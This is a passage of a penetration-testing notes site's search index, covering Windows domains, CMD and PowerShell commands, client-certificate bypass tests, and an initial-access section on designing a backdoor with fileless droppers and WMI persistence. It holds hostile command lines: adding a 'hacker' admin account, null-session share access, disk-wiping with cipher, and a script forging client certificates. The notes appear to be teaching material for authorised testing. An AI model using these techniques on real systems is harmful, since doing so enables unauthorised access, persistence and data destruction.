machine it authenticates against the domain controller. This way it is ultimately the domain controller that decides security policy. Length of password, how often it should be changed, disabling accounts. If a users quits his/hers job you can just remove his/her account. The person in control over the domain controller is in control of the network. As a pentester you are most likely very interesting in gaining access the the domain controller with Administrator-privileges. That means you control the network. Since you authenticate against a domain controller you can log in to your account from any of the machines in the network. Think of systems you have had in schools and universities, where you can just sit down by any computer and log in to your account. This is usually a domain type network. In order to set up a Domain network you need at least one Windows server for the domain controller. If you have hacked a machine and you want to know if it is part of either a Workgroup or a domain you can do the following: go to Control panel/System . If it says Workgroup: something it means that the machine is connected to a workgroup, and not a domain.","title":"Windows domain"},{"location":"basics_of_windows/basics_of_windows/#active-directory","text":"From Windows 2000 and on the application Active directory has been program used for maintaining the central database of users and configurations.","title":"Active directory"},{"location":"basics_of_windows/basics_of_windows/#domain-controller","text":"Any windows computer can be configured to be a domain controller. The domain controller manages all the security aspects of the interaction between user and domain. There are usually a least two computers configured to be domain-controllers. In case one breaks down. If you have compromised a machine that belong to a domain you can check if it has any users. DC:s don't have local users. If you run enum4linux you can look out for this section Nbtstat Information <1c> - <GROUP> B <ACTIVE> Domain Controllers A third way is to run this command echo %logonserver%","title":"Domain controller"},{"location":"basics_of_windows/basics_of_windows/#smb","text":"On networks that are based on Linux and you need to integrate a windows machine you can use SMB to do that.","title":"SMB"},{"location":"basics_of_windows/basics_of_windows/#kerberos","text":"Kerberos is a network authentication protocol. The original protocol is used by many unix-systems. Windows have their own version of the Kerberos protocol, so that it works with their NT-kernel. It is used by windows Domains to authenticate users. But kerberos can also be found in several unix-operating systems. Kerberos was not built by windows, but long before. I think a machine that has port 88 open (the default kerberos port) can be assumed to be a Domain Controller. When a user logs in to the domain Active Directory uses Kerberos to authenticate the user. When the user insert her password it gets one-way encrypted and sent with Kerberos to the Active directory, which then compares it with its password database. The Key Distribution Center responds with a TGI ticket to the user machine.","title":"Kerberos"},{"location":"basics_of_windows/basics_of_windows/#workgroup","text":"A workgroup architecture stands in contrast to the domain-system. A workgroup is based on the idea of peer-to-peer and not server-client as domain is. In a domain network you have a server (domain controller) and a client (the user). Therefore it might be a bit hard to control a network bigger than a dozen clients. So it is usually used for smaller networks. If a computer is part of a workgroup it cannot be part of a domain. In a workgroup architecture each computer is in charge of its own security settings. So there is no single computer in charge of all the security settings for the workgroup. This is good because you don't have one single point of failure, bt is also bad because you have to trust the users to configure their machines securely. In a network you can have several workgroups. But that is usually not the case. In a workgroup users can see each other, and share files.","title":"Workgroup"},{"location":"basics_of_windows/basics_of_windows/#user-privileges","text":"How does the user-system work on windows.","title":"User privileges"},{"location":"basics_of_windows/basics_of_windows/#system-user","text":"System is actually not a user per se. System is technically a security principle. One big difference between System and Administrator is that is the computer is connected to a domain the system user can access the domain in the context of the domain account. The administrator cannot. On windows it is possible to grant permission of a file to System but not to Administrator. One example of this is the SAM key, which contains local account information. The System user has access to this information, but the Administrator does not. http://superuser.com/questions/504136/root-vs-administrator-vs-system","title":"System (user)"},{"location":"basics_of_windows/basics_of_windows/#administrator","text":"Administrator is a default account on Windows. It is the user with the highest privileges.","title":"Administrator"},{"location":"basics_of_windows/basics_of_windows/#normal-user","text":"The normal user obviously have less privileges than the Administrator. You can add a new user through the cmd with the following command: net user username /add net user kalle secret_password123 /add # Add user to administrator group - thus making it administrator net localgroup administrators kalle /add # Add to Remote Desktop User https://www.windows-commandline.com/add-user-to-group-from-command-line/","title":"Normal user"},{"location":"basics_of_windows/basics_of_windows/#structure-of-windows","text":"https://en.wikipedia.org/wiki/Directory_structure","title":"Structure of windows"},{"location":"basics_of_windows/basics_of_windows/#windows-7","text":"The root folder of windows c:\\ by default contains the following Windows Users","title":"Windows 7"},{"location":"basics_of_windows/basics_of_windows/#registry","text":"You often hear talk about the registry when talking about Windows. But what is really the registry? Well the windows registry is a hierarchical database that stores low-level settings used by the OS or any other application that uses it. The SAM (Security account manager) uses it, along with a lot of other stuff. There is not really any equivalent for the Registry in Linux. Most configurations are done in text-files in Linux.You can usually find the under /etc .","title":"Registry"},{"location":"basics_of_windows/basics_of_windows/#edit-the-registry","text":"In Linux you usually just sudo-edit a config-file in /etc . In Windows you open Regedit and you can see the whole hierarchy. The registry is built with Key-value pairs.","title":"Edit the registry"},{"location":"basics_of_windows/basics_of_windows/#sam","text":"","title":"SAM"},{"location":"basics_of_windows/basics_of_windows/#drivers","text":"You hear a lot of talk about drivers in the Windows ecosystem, but not in Linux. That is because in Linux the drivers are open-sourced and included in the kernel, for most part. These drivers might be produced by nice programmers or they could be developed by the hardware-producer themselves. That's why it is so easy and fast to install new hardware on Linux. If it is compatible that is. Drivers are software lets the OS communicate with the hardware. Like networks cards, graphics card, printers. To list all the drivers on the machine use the following command: driverquery This can we good to know since drivers can contains vulnerabilities that can be used for priv-esc. Check out the chapter on that.","title":"Drivers"},{"location":"basics_of_windows/basics_of_windows/#iis-windows-web-server","text":"IIS stands for Internet Information Services (before it was Internet Information Server). The software is usually includede in most Windows versions, except for the home editions. The IIS version usually corresponds to the OS version. There is a new IIS version for every new OS, in general. By default IIS 5.1 and earlier run websites in a single process running the context of the System account","title":"IIS - Windows web server"},{"location":"basics_of_windows/basics_of_windows/#asp","text":"Activ server pages is the scripting environment for IIS. ASP render the content on the server side. The scripting languages that are supported are: VBScript, JScript and PerlScript.","title":"ASP"},{"location":"basics_of_windows/basics_of_windows/#important-files-and-stuff","text":"SAM key","title":"Important files and stuff"},{"location":"basics_of_windows/basics_of_windows/#file-types","text":"In windows file-ending are important.","title":"File types"},{"location":"basics_of_windows/basics_of_windows/#bat","text":".bat -files are the windows equivalent to bash-scripts In order to write a batch-script you open up an editor and then just write your commands. And then you save it as blabla.bat. And make sure you don't save it as a text file. Then you just run the script from the cmd","title":"BAT"},{"location":"basics_of_windows/basics_of_windows/#dll-dynamic-link-library","text":"A DLL file is a library that is used for one or more program. It is a binary-file but it is not executable in itself, but it contains code that the executable calls. It is used to modularize the code of a program. In the windows operating system DLL files are shared among different applications. For example, the dll Comdlg32 is used to create dialog boxes. So different applications can invoke this library to easily create a dialog box. This promotes code reuse. So an application may use the standard windows DLL-files, but it may also bring its own DLL-files. So if one DLL-file is missing for a program a certain module might not work. As most Windows-users have sometime experienced.","title":"DLL - Dynamic Link Library"},{"location":"basics_of_windows/basics_of_windows/#lib","text":"Lib is a bit like DLL, it is a library. But it is not dynamic as DLL. So lib-files are linked on compile-time. While dll-files are linked in run-time. Since lib-files are compiled into the executable you never see it (unless you are developing of course). But since DLL-files are dynamically loaded at run-time they are still around for the user to see.","title":"LIB"},{"location":"basics_of_windows/basics_of_windows/#references","text":"http://compudyne.net/post08152012/ http://www.r00tsec.com/2012/11/howto-manual-pentest-windows-cheatsheet.html","title":"References"},{"location":"basics_of_windows/cmd/","text":"CMD - Windows commands # The equivalent to the Linux command ; as in echo \"command 1\" ; echo \"command 2\" is dir & whoami Dealing with files and stuff # Delete file del Create folder/directory md folderName Show hidden files dir /A Print out file content, like cat type file.txt grep files findstr file.txt Network # Show network information netstat -an Show network adapter info ipconfig Ping another machine ping 192.168.1.101 Traceroute tracert Processes # List processes tasklist Kill a process taskkill /PID 1532 /F Users # net users :: Add user net user hacker my_password /add net localgroup Administrator hacker /add :: Check if you are part of a domain net localgroup /domain :: List all users in a domain net users /domain Other # Shutdown :: Shutdown now shutdown /s /t 0 :: Restart shutdown /r /t 0 cipher - Clear data/shred :: Shreds the whole machine cipher /w:C:\\ Show environmental variables set Show options for commands The \"man\"-pages in windows is simply: help dir Mounting - Mapping # In the windows world mounting is called mapping. If you want to see which drives are mapped/mounted to your file-system you can use any of these commands: ::This is the most thorough wmic logicaldisk get deviceid, volumename, description ::But this works too wmic logicaldisk get name wmic logicaldisk get caption ::This can be slow. So don't kill your shell! fsutil fsinfo drives ::With powershell get-psdrive -psprovider filesystem ::This works too, but it is interacive. So it might be dangerous work hackers diskpart list volume ::Map only network drives net use The command to deal with mounting/mapping is net use Using net use we can connect to other shared folder, on other systems. Many windows machines have a default-share called IPC (Interprocess communication share). It does not contain any files. But we can usually connect to it without authentication. This is called a null-session . Although the share does not contain any files it contains a lot of data that is useful for enumeration. The Linux-equivalent of net use is usually smbclient . net use \\\\IP address\\IPC$ \"\" /u:\"\" net use \\\\192.168.1.101\\IPC$ \"\" /u:\"\" If you want to map a drive from another network to your filesystem you can do that like this: :: This will map it to drive z net use z: \\\\192.168.1.101\\SYSVOL :: This will map it to the first available drive-letter net use * \\\\192.168.1.101\\SYSVOL Here you map the drive to the letter z . If the command is successful you should now be able to access those files by entering the z drive. You enter the z-drive by doing this: C:\\>z: Z:\\ :: Now we switch back to c Z:\\>c: C:\\ Remove a network drive - umount it First leave the drive if you are in it: c: net use z: /del References and Stuff # This might come in handy for the linux-users: http://www.lemoda.net/windows/windows2unix/windows2unix.html","title":"CMD"},{"location":"basics_of_windows/cmd/#cmd-windows-commands","text":"The equivalent to the Linux command ; as in echo \"command 1\" ; echo \"command 2\" is dir & whoami","title":"CMD - Windows commands"},{"location":"basics_of_windows/cmd/#dealing-with-files-and-stuff","text":"Delete file del Create folder/directory md folderName Show hidden files dir /A Print out file content, like cat type file.txt grep files findstr file.txt","title":"Dealing with files and stuff"},{"location":"basics_of_windows/cmd/#network","text":"Show network information netstat -an Show network adapter info ipconfig Ping another machine ping 192.168.1.101 Traceroute tracert","title":"Network"},{"location":"basics_of_windows/cmd/#processes","text":"List processes tasklist Kill a process taskkill /PID 1532 /F","title":"Processes"},{"location":"basics_of_windows/cmd/#users","text":"net users :: Add user net user hacker my_password /add net localgroup Administrator hacker /add :: Check if you are part of a domain net localgroup /domain :: List all users in a domain net users /domain","title":"Users"},{"location":"basics_of_windows/cmd/#other","text":"Shutdown :: Shutdown now shutdown /s /t 0 :: Restart shutdown /r /t 0 cipher - Clear data/shred :: Shreds the whole machine cipher /w:C:\\ Show environmental variables set Show options for commands The \"man\"-pages in windows is simply: help dir","title":"Other"},{"location":"basics_of_windows/cmd/#mounting-mapping","text":"In the windows world mounting is called mapping. If you want to see which drives are mapped/mounted to your file-system you can use any of these commands: ::This is the most thorough wmic logicaldisk get deviceid, volumename, description ::But this works too wmic logicaldisk get name wmic logicaldisk get caption ::This can be slow. So don't kill your shell! fsutil fsinfo drives ::With powershell get-psdrive -psprovider filesystem ::This works too, but it is interacive. So it might be dangerous work hackers diskpart list volume ::Map only network drives net use The command to deal with mounting/mapping is net use Using net use we can connect to other shared folder, on other systems. Many windows machines have a default-share called IPC (Interprocess communication share). It does not contain any files. But we can usually connect to it without authentication. This is called a null-session . Although the share does not contain any files it contains a lot of data that is useful for enumeration. The Linux-equivalent of net use is usually smbclient . net use \\\\IP address\\IPC$ \"\" /u:\"\" net use \\\\192.168.1.101\\IPC$ \"\" /u:\"\" If you want to map a drive from another network to your filesystem you can do that like this: :: This will map it to drive z net use z: \\\\192.168.1.101\\SYSVOL :: This will map it to the first available drive-letter net use * \\\\192.168.1.101\\SYSVOL Here you map the drive to the letter z . If the command is successful you should now be able to access those files by entering the z drive. You enter the z-drive by doing this: C:\\>z: Z:\\ :: Now we switch back to c Z:\\>c: C:\\ Remove a network drive - umount it First leave the drive if you are in it: c: net use z: /del","title":"Mounting - Mapping"},{"location":"basics_of_windows/cmd/#references-and-stuff","text":"This might come in handy for the linux-users: http://www.lemoda.net/windows/windows2unix/windows2unix.html","title":"References and Stuff"},{"location":"basics_of_windows/default_windows_files/","text":"All versions of Windows # c:/windows/system32/drivers/etc/hosts c:/windows/win.ini","title":"Default Windows Files"},{"location":"basics_of_windows/default_windows_files/#all-versions-of-windows","text":"c:/windows/system32/drivers/etc/hosts c:/windows/win.ini","title":"All versions of Windows"},{"location":"basics_of_windows/powershell/","text":"PowerShell # PowerShell is Windows new shell. It comes by default from Windows 7. But can be downloaded and installed in earlier versions. PowerShell provides access to almost everything an attacker might want. It is based on the .NET framework. It is basically bash for windows The commands are case-insensitive Basics # So a command in PowerShell is called cmdlet . The cmdlets are created using a verb and a noun. Like Get-Command , Get is a verb and Command is a noun. Other verbs can be: remove, set, disable, install, etc. To get help on how to use a cmdlet while in PowerShell, the man-page, you do: Get-Help <cmdlet name | topic name> Example get-help echo get-help get-command Find out what flags you can use just write get-command - en then start tabbing. Powershell Version and Build $PSVersionTable Fundamentals # With get-member you can list all the properties and methods of the object that the command returns. Get-Member For example: Get-Command | Get-Member Get-Process | Get-Member Select-XXX Select-object Variables # $testVar = \"blabla\" Wget / Download a file Invoke-WebRequest <uri> wget <uri> Grep Select string can be used like grep get-command | select-string blabla General commands that can be used on objects measure-object -words get-content fil.txt | measure-object words Working with filesystem # List all files in current directory get-childitem gci List hidden files too gci -Force List all files recurisvely gci -rec Count the files (get-childitem).count List all files but exclude some folders gci -exclude AppData | gci -rec -force Working with files # Read a file Get-Content gc cat Count lines of file (get-content .\\file).count Select specific line in a file (remember that it starts from 0) (gc .\\file.txt)[10] gc .\\file.txt | Select -index 10 Services # List services get-service Network related stuff # Domain information Get-ADDomain Get-AdDomainController Get-AdComputer To see a list of all properties do this get-adcomputer ComputerName -prop * Get AD Users Get-ADUser -f {Name -eq 'Karl, Martinez'} -properties * Get all AD Groups Get-ADGroup -filter * Resolve DNS Resolve-DNSname 10.10.10.10","title":"Powershell"},{"location":"basics_of_windows/powershell/#powershell","text":"PowerShell is Windows new shell. It comes by default from Windows 7. But can be downloaded and installed in earlier versions. PowerShell provides access to almost everything an attacker might want. It is based on the .NET framework. It is basically bash for windows The commands are case-insensitive","title":"PowerShell"},{"location":"basics_of_windows/powershell/#basics","text":"So a command in PowerShell is called cmdlet . The cmdlets are created using a verb and a noun. Like Get-Command , Get is a verb and Command is a noun. Other verbs can be: remove, set, disable, install, etc. To get help on how to use a cmdlet while in PowerShell, the man-page, you do: Get-Help <cmdlet name | topic name> Example get-help echo get-help get-command Find out what flags you can use just write get-command - en then start tabbing. Powershell Version and Build $PSVersionTable","title":"Basics"},{"location":"basics_of_windows/powershell/#fundamentals","text":"With get-member you can list all the properties and methods of the object that the command returns. Get-Member For example: Get-Command | Get-Member Get-Process | Get-Member Select-XXX Select-object","title":"Fundamentals"},{"location":"basics_of_windows/powershell/#variables","text":"$testVar = \"blabla\" Wget / Download a file Invoke-WebRequest <uri> wget <uri> Grep Select string can be used like grep get-command | select-string blabla General commands that can be used on objects measure-object -words get-content fil.txt | measure-object words","title":"Variables"},{"location":"basics_of_windows/powershell/#working-with-filesystem","text":"List all files in current directory get-childitem gci List hidden files too gci -Force List all files recurisvely gci -rec Count the files (get-childitem).count List all files but exclude some folders gci -exclude AppData | gci -rec -force","title":"Working with filesystem"},{"location":"basics_of_windows/powershell/#working-with-files","text":"Read a file Get-Content gc cat Count lines of file (get-content .\\file).count Select specific line in a file (remember that it starts from 0) (gc .\\file.txt)[10] gc .\\file.txt | Select -index 10","title":"Working with files"},{"location":"basics_of_windows/powershell/#services","text":"List services get-service","title":"Services"},{"location":"basics_of_windows/powershell/#network-related-stuff","text":"Domain information Get-ADDomain Get-AdDomainController Get-AdComputer To see a list of all properties do this get-adcomputer ComputerName -prop * Get AD Users Get-ADUser -f {Name -eq 'Karl, Martinez'} -properties * Get all AD Groups Get-ADGroup -filter * Resolve DNS Resolve-DNSname 10.10.10.10","title":"Network related stuff"},{"location":"basics_of_windows/powershell_scripting2/","text":"Powershell scripting # Variables # Variables are declared like this $test = \"something\" Execute scripts # So for security reasons the default policy for executing scripts is Restricted . Here are the different script-policies. Restricted : PowerShell won't run any scripts. This is PowerShell's default execution policy. AllSigned : PowerShell will only run scripts that are signed with a digital signature. If you run a script signed by a publisher PowerShell hasn't seen before, PowerShell will ask whether you trust the script's publisher. RemoteSigned : PowerShell won't run scripts downloaded from the Internet unless they have a digital signature, but scripts not downloaded from the Internet will run without prompting. If a script has a digital signature, PowerShell will prompt you before it runs a script from a publisher it hasn't seen before. Unrestricted : PowerShell ignores digital signatures but will still prompt you before running a script downloaded from the Internet. Source: http://windowsitpro.com/powershell/running-powershell-scripts-easy-1-2-3 So if we want to run script myscript.ps1 we have to set the execution-policy. First let's check what execution-policy we currently have: Get-ExecutionPolicy Then we can set the execution policy like this set-ExecutionPolicy unrestricted References # https://github.com/samratashok/nishang https://www.youtube.com/watch?v=czJrXiLs0wM","title":"Powershell Scripting"},{"location":"basics_of_windows/powershell_scripting2/#powershell-scripting","text":"","title":"Powershell scripting"},{"location":"basics_of_windows/powershell_scripting2/#variables","text":"Variables are declared like this $test = \"something\"","title":"Variables"},{"location":"basics_of_windows/powershell_scripting2/#execute-scripts","text":"So for security reasons the default policy for executing scripts is Restricted . Here are the different script-policies. Restricted : PowerShell won't run any scripts. This is PowerShell's default execution policy. AllSigned : PowerShell will only run scripts that are signed with a digital signature. If you run a script signed by a publisher PowerShell hasn't seen before, PowerShell will ask whether you trust the script's publisher. RemoteSigned : PowerShell won't run scripts downloaded from the Internet unless they have a digital signature, but scripts not downloaded from the Internet will run without prompting. If a script has a digital signature, PowerShell will prompt you before it runs a script from a publisher it hasn't seen before. Unrestricted : PowerShell ignores digital signatures but will still prompt you before running a script downloaded from the Internet. Source: http://windowsitpro.com/powershell/running-powershell-scripts-easy-1-2-3 So if we want to run script myscript.ps1 we have to set the execution-policy. First let's check what execution-policy we currently have: Get-ExecutionPolicy Then we can set the execution policy like this set-ExecutionPolicy unrestricted","title":"Execute scripts"},{"location":"basics_of_windows/powershell_scripting2/#references","text":"https://github.com/samratashok/nishang https://www.youtube.com/watch?v=czJrXiLs0wM","title":"References"},{"location":"cryptography/client_certificate_tests/","text":"Background # First, in order to validate a client certificate the server (or load balancer) will need to have the root certificate that signed the client certificate installed. So a CA issues a root certificate. The public key of that root certificate signs the client certificate. Typically, the root CA does not sign server or client certificates directly. The root CA is only ever used to create one or more intermediate CAs, which are trusted by the root CA to sign certificates on their behalf. When the client authenticates the server can verify that the client certificate really was signed by the CA. And thereby trust it. It is common that load balancers verify the client certificate. You can usually figure out what load balancer it is by looking at response headers and cookies. For example F5 load balancers usually tests a cookie that looks something like this: TS******* TS01***** The load balancers usually verifies the client cerificate, retrieve som information from the certificate and the pass it along to the application. The information sent from the load balancer to the application server is usually sent in a specific header. Here is a list of common headers that carries this information. Copied from here: https://github.com/wallarm/cert-headers/blob/master/headers.list. #F5 SSLClientCertStatus SSLClientCertSN SSLClientCertb64 X-Client-Cert X-Client-Certificate X-Client-Crt #HAProxy X-SSL X-SSL-Client-Cert X-SSL-Client-Verify X-SSL-Client-SHA1 X-SSL-Client-DN X-SSL-Client-CN X-SSL-Issuer X-SSL-Client-Not-Before X-SSL-Client-Not-After X-SSL-Client-Serial X-SSL-Client-Version X-Valid-Certificate #Nginx X-SSL-CERT X-SSL-VERIFIED X-SSL-CLIENT-DN X-SSL-ISSUER-DN PKCS # 12 # PKCS (Public-Key Cryptography Standard) # 12 is an archive format. Is it used to store two things. A public X509 certificate and a private key, or to bundle all members of a chain of trust. The format is binary and can be read using openssl. It would be nice if the data would be stored in a semi-normal format such as JSON or XML, but it isn't. The format is described in RFC 7292: https://tools.ietf.org/html/rfc7292 openssl pkcs12 -info -in ClientCertificate.pfx It usually has the fileneding .p12 or .pfx. PFX and PKCS12 are sometimes used interchangebly. PEM # Pem is a simpler format than PKCS 12. It usually only includes a certificates and private key as base64 strings. Checks # Access without certificate # Applications can be configured to ask for client certificate without actually validating them. For example in F5 is it is configured to \"request\" and not \"required\". https://devcentral.f5.com/s/articles/How-Client-SSL-Authentication-works-on-BIG-IP Send self-signed certificate # If the server looks at issuer or subject lines it might be possible to bypass it by simply copying those lines. Step 1: Create CA openssl req -newkey rsa:4096 -keyform PEM -keyout ca.key -x509 -days 3650 -outform PEM -out ca.cer Step 2: Generate Client certificate Generate a key openssl genrsa -out client.key 4096 Generate a certificate signing request openssl req -new -key client.key -out client.req Sign the CSR: openssl x509 -req -in client.req -CA ca.cer -CAkey ca.key -set_serial 101 -extensions client -days 365 -outform PEM -out client.cer Step 3: Convert to PKCS12 openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12 Here is a script that generates client-certificates with your specified issuer, subject and serialnumber. #/bin/bash function generate_certificate { PASSWORD=\"pass\" ISSUER=\"/C=SE/O=Example/OU=ExampleOU/CN=ExamplePurpose\" SERIALNUMBER=\"100000000\" SUBJECT=\"/C=SE/ST=Sweden/L=Stockholm/O=ExampleO/CN=test.test.com\" echo \"[*] Generating CA\" openssl req -newkey rsa:4096 -keyform PEM -keyout ca.key -x509 -days 3650 -outform PEM -out ca.cer -subj \"$ISSUER\" -passout pass:$PASSWORD echo \"[*] Reading the result\" openssl x509 -in ca.cer -text -noout echo \"[*] Generating client key\" openssl genrsa -out client.key 4096 echo \"[*] Generating CSR from configuration file\" openssl req -new -key client.key -out client.req -subj \"$SUBJECT\" echo \"[*] Signing the CSR\" openssl x509 -req -in client.req -CA ca.cer -CAkey ca.key -set_serial $SERIALNUMBER -extensions client -days 365 -outform PEM -out client.cer -passin pass:$PASSWORD echo \"[*] Transforming inteo p12 format\" openssl pkcs12 -passout pass:$PASSWORD -export -inkey client.key -in client.cer -out client.p12 echo \"[*] Reading the final p12 certificate\" openssl pkcs12 -passin pass:$PASSWORD -passout pass:$PASSWORD -info -in client.p12 exit } generate_certificate Generate Client Certificate (s/mime) from a trusted CA # It is possible to create a S/MIME cert for free (or payed) associated with your email address. It might be that the backend only verifies that the client certificate is generated by a public CA. If that is the case it might work. The default behaviour in IIS is to trust the windows default CA store. So if you generate a s/mime cert from comodo or whatever it might work. You can generate a free s/mime certificate here: https://extrassl.actalis.it/portal/uapub/freemail?lang=en","title":"Client Certificate Tests"},{"location":"cryptography/client_certificate_tests/#background","text":"First, in order to validate a client certificate the server (or load balancer) will need to have the root certificate that signed the client certificate installed. So a CA issues a root certificate. The public key of that root certificate signs the client certificate. Typically, the root CA does not sign server or client certificates directly. The root CA is only ever used to create one or more intermediate CAs, which are trusted by the root CA to sign certificates on their behalf. When the client authenticates the server can verify that the client certificate really was signed by the CA. And thereby trust it. It is common that load balancers verify the client certificate. You can usually figure out what load balancer it is by looking at response headers and cookies. For example F5 load balancers usually tests a cookie that looks something like this: TS******* TS01***** The load balancers usually verifies the client cerificate, retrieve som information from the certificate and the pass it along to the application. The information sent from the load balancer to the application server is usually sent in a specific header. Here is a list of common headers that carries this information. Copied from here: https://github.com/wallarm/cert-headers/blob/master/headers.list. #F5 SSLClientCertStatus SSLClientCertSN SSLClientCertb64 X-Client-Cert X-Client-Certificate X-Client-Crt #HAProxy X-SSL X-SSL-Client-Cert X-SSL-Client-Verify X-SSL-Client-SHA1 X-SSL-Client-DN X-SSL-Client-CN X-SSL-Issuer X-SSL-Client-Not-Before X-SSL-Client-Not-After X-SSL-Client-Serial X-SSL-Client-Version X-Valid-Certificate #Nginx X-SSL-CERT X-SSL-VERIFIED X-SSL-CLIENT-DN X-SSL-ISSUER-DN","title":"Background"},{"location":"cryptography/client_certificate_tests/#pkcs-12","text":"PKCS (Public-Key Cryptography Standard) # 12 is an archive format. Is it used to store two things. A public X509 certificate and a private key, or to bundle all members of a chain of trust. The format is binary and can be read using openssl. It would be nice if the data would be stored in a semi-normal format such as JSON or XML, but it isn't. The format is described in RFC 7292: https://tools.ietf.org/html/rfc7292 openssl pkcs12 -info -in ClientCertificate.pfx It usually has the fileneding .p12 or .pfx. PFX and PKCS12 are sometimes used interchangebly.","title":"PKCS # 12"},{"location":"cryptography/client_certificate_tests/#pem","text":"Pem is a simpler format than PKCS 12. It usually only includes a certificates and private key as base64 strings.","title":"PEM"},{"location":"cryptography/client_certificate_tests/#checks","text":"","title":"Checks"},{"location":"cryptography/client_certificate_tests/#access-without-certificate","text":"Applications can be configured to ask for client certificate without actually validating them. For example in F5 is it is configured to \"request\" and not \"required\". https://devcentral.f5.com/s/articles/How-Client-SSL-Authentication-works-on-BIG-IP","title":"Access without certificate"},{"location":"cryptography/client_certificate_tests/#send-self-signed-certificate","text":"If the server looks at issuer or subject lines it might be possible to bypass it by simply copying those lines. Step 1: Create CA openssl req -newkey rsa:4096 -keyform PEM -keyout ca.key -x509 -days 3650 -outform PEM -out ca.cer Step 2: Generate Client certificate Generate a key openssl genrsa -out client.key 4096 Generate a certificate signing request openssl req -new -key client.key -out client.req Sign the CSR: openssl x509 -req -in client.req -CA ca.cer -CAkey ca.key -set_serial 101 -extensions client -days 365 -outform PEM -out client.cer Step 3: Convert to PKCS12 openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12 Here is a script that generates client-certificates with your specified issuer, subject and serialnumber. #/bin/bash function generate_certificate { PASSWORD=\"pass\" ISSUER=\"/C=SE/O=Example/OU=ExampleOU/CN=ExamplePurpose\" SERIALNUMBER=\"100000000\" SUBJECT=\"/C=SE/ST=Sweden/L=Stockholm/O=ExampleO/CN=test.test.com\" echo \"[*] Generating CA\" openssl req -newkey rsa:4096 -keyform PEM -keyout ca.key -x509 -days 3650 -outform PEM -out ca.cer -subj \"$ISSUER\" -passout pass:$PASSWORD echo \"[*] Reading the result\" openssl x509 -in ca.cer -text -noout echo \"[*] Generating client key\" openssl genrsa -out client.key 4096 echo \"[*] Generating CSR from configuration file\" openssl req -new -key client.key -out client.req -subj \"$SUBJECT\" echo \"[*] Signing the CSR\" openssl x509 -req -in client.req -CA ca.cer -CAkey ca.key -set_serial $SERIALNUMBER -extensions client -days 365 -outform PEM -out client.cer -passin pass:$PASSWORD echo \"[*] Transforming inteo p12 format\" openssl pkcs12 -passout pass:$PASSWORD -export -inkey client.key -in client.cer -out client.p12 echo \"[*] Reading the final p12 certificate\" openssl pkcs12 -passin pass:$PASSWORD -passout pass:$PASSWORD -info -in client.p12 exit } generate_certificate","title":"Send self-signed certificate"},{"location":"cryptography/client_certificate_tests/#generate-client-certificate-smime-from-a-trusted-ca","text":"It is possible to create a S/MIME cert for free (or payed) associated with your email address. It might be that the backend only verifies that the client certificate is generated by a public CA. If that is the case it might work. The default behaviour in IIS is to trust the windows default CA store. So if you generate a s/mime cert from comodo or whatever it might work. You can generate a free s/mime certificate here: https://extrassl.actalis.it/portal/uapub/freemail?lang=en","title":"Generate Client Certificate (s/mime) from a trusted CA"},{"location":"initial_access/initial_access/","text":"Goal # The type of malware we develop depends completely on the goal of the mission. If the goal is to hijack web-traffic of a users that use banks it might be better to write the malware to disk, and have it execute on boot and then lay silent until the suer authenticates to his bank. If the goal is to encrypt the entire disk, well then that is what the malware will do. If the goal is gain an entrance to network, it might be useful with a shell. Do you want it to spread automatically, like a virus? Then you need those functionalities. Do you want it to be more like a backdoor? So you get a shell whenever you want. We want to build a Backdoor, more than a specific malware. We want to write as little to disk as possible. Instead of writing a payload to disk we will activate it on boot, and the dropper will be executed everytime. This is good because if the malware is discovered it will not reveal the actual payload, only the dropper. This is assuming that the target is a user that produces a lot of network traffic, so another request will not make much of a differece. We want persistence. We want a shell. Simple as that. First stage loader - Dropper # The idea is to have a lightwight first stage payload. The first stage payload will only load in the second stage payload in memory. See the next chapter on how to generate Droppers. Ways too load into memory - Fileless stager # The traditional way has been to download the second stager to disk somewhere. But new research has found more efficient ways to do this, not having to write anything to disk. The new way to only load into memory is somtimes calld a fileless stager. - Using PowerShell This is the most common way. And we have all used it, invoke-expression. Using WMI - PreProcessor # Persistence # WMI # WMI is often used. You can create events that are executed when the event is triggered. An event can be anything, like when the screensaver runs, when the computer is locked. It requires Administrative priviliges in order to create a permanent event subscription. You can also create a new WMI class. And in that class store a base64-encrypted property, which is in fact a powershell command. Then you create a WMI event subscripting. When the event is triggered the base64-encoded property is retrieved and the powershell command is excecuted. This way the only backdoor that is left is in the WMI repository, nothing else on disk. This was documented here: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html There are a few ways https://blog.netspi.com/getting-started-wmi-weaponization-part-5/","title":"Initial Access"},{"location":"initial_access/initial_access/#goal","text":"The type of malware we develop depends completely on the goal of the mission. If the goal is to hijack web-traffic of a users that use banks it might be better to write the malware to disk, and have it execute on boot and then lay silent until the suer authenticates to his bank. If the goal is to encrypt the entire disk, well then that is what the malware will do. If the goal is gain an entrance to network, it might be useful with a shell. Do you want it to spread automatically, like a virus? Then you need those functionalities. Do you want it to be more like a backdoor? So you get a shell whenever you want. We want to build a Backdoor, more than a specific malware. We want to write as little to disk as possible. Instead of writing a payload to disk we will activate it on boot, and the dropper will be executed everytime. This is good because if the malware is discovered it will not reveal the actual payload, only the dropper. This is assuming that the target is a user that produces a lot of network traffic, so another request will not make much of a differece. We want persistence. We want a shell. Simple as that.","title":"Goal"},{"location":"initial_access/initial_access/#first-stage-loader-dropper","text":"The idea is to have a lightwight first stage payload. The first stage payload will only load in the second stage payload in memory. See the next chapter on how to generate Droppers.","title":"First stage loader - Dropper"},{"location":"initial_access/initial_access/#ways-too-load-into-memory-fileless-stager","text":"The traditional way has been to download the second stager to disk somewhere. But new research has found more efficient ways to do this, not having to write anything to disk. The new way to only load into memory is somtimes calld a fileless stager. - Using PowerShell This is the most common way. And we have all used it, invoke-expression. Using WMI","title":"Ways too load into memory - Fileless stager"},{"location":"initial_access/initial_access/#-preprocessor","text":"","title":"- PreProcessor"},{"location":"initial_access/initial_access/#persistence","text":"","title":"Persistence"},{"location":"initial_access/initial_access/#wmi","text":"WMI is often used. You can create events that are executed when the event is triggered. An event can be anything, like when the screensaver runs, when the computer is locked. It requires Administrative priviliges in order to create a permanent event subscription. You can also create a new WMI class. And in that class store a base64-encrypted property, which is in fact a powershell command. Then you create a WMI event subscripting. When the event is triggered the base64-encoded property is retrieved and the powershell command is excecuted. This way the only backdoor that is left is in the WMI repository, nothing else on disk. This was documented here: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html There are a few ways 